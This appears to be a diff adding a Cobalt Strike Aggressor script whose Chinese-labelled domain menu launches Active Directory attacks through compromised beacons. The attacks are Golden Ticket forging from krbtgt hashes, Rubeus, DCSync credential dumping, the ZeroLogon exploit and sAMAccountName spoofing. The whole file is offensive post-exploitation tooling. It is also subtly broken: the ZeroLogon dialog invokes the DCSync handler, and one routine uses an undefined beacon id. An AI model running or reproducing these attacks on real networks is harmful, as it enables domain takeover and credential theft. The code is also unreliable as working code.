@@ -1,0 +1,66 @@
+sub GoldenTicket{
+	bpowerpick!($3['bid'],"Invoke-GoldenTicket $3['hashs']");
+}
+sub Rubeus{
+	bpowerpick!($3['bid'],"Invoke-Rubeus $3['command']");
+}
+sub DCSync{
+	bpowerpick!($3['bid'],"Invoke-DCSync $3['command']");
+}
+sub ZeroLogon{
+	bpowershell_import($bid, script_resource("bin/ZeroLogon.ps1"));
+	if($3["Scan"] eq 'true'){
+		bpowerpick!($3['bid'],"Invoke-Zerologon $3['fqdn'] 0");
+	} else {
+		bpowerpick!($3['bid'],"Invoke-Zerologon $3['fqdn'] 1");
+	}
+	
+}
+menu "域"{
+	include(script_resource("modules/powerview.cna"));
+	menu "sAMSpoofing"{
+		item "加载sAMSpooofing"{
+			$bid = $1;
+			bpowershell_import($bid, script_resource("bin/sAMSpoofing.ps1"));
+			bpowerpick!($bid,"Invoke-sAMSpooofing");
+		}
+		item "GoldenTicket"{
+			$bid = $1;
+			$dialog = dialog("GoldenTicket", %(hashs => "krbtgt hashs",bid => $bid), &GoldenTicket);
+	        dialog_description($dialog, "GoldenTicket");
+	        drow_text_big($dialog,"hashs","hashs:");
+	        dbutton_action($dialog, "Send");
+	        dialog_show($dialog);
+		}
+		item "Invoke-GoldenTips"{
+			$bid = $1;
+			bpowerpick!($bid,"Invoke-GoldenTips");
+		}
+		item "Invoke-Rubeus"{
+			$bid = $1;
+			$dialog = dialog("Rubeus", %(command => "",bid => $bid), &Rubeus);
+	        dialog_description($dialog, "Rubeus");
+	        drow_text_big($dialog,"command","command:");
+	        dbutton_action($dialog, "Send");
+	        dialog_show($dialog);
+		}
+		item "Invoke-DCSync"{
+			$bid = $1;
+			$dialog = dialog("DCSync", %(command => "",bid => $bid), &DCSync);
+	        dialog_description($dialog, "DCSync");
+	        drow_text_big($dialog,"command","command:");
+	        dbutton_action($dialog, "Send");
+	        dialog_show($dialog);
+		}
+
+	}
+	item "ZeroLogon"{
+		$bid = $1;
+		$dialog = dialog("ZeroLogon", %(fqdn => "",bid => $bid), &DCSync);
+        dialog_description($dialog, "ZeroLogon");
+        drow_text_big($dialog,"fqdn","FQDN:");
+        drow_checkbox($dialog, "Scan","仅扫描?" , "Scan");
+        dbutton_action($dialog, "Send");
+        dialog_show($dialog);
+	}
+}
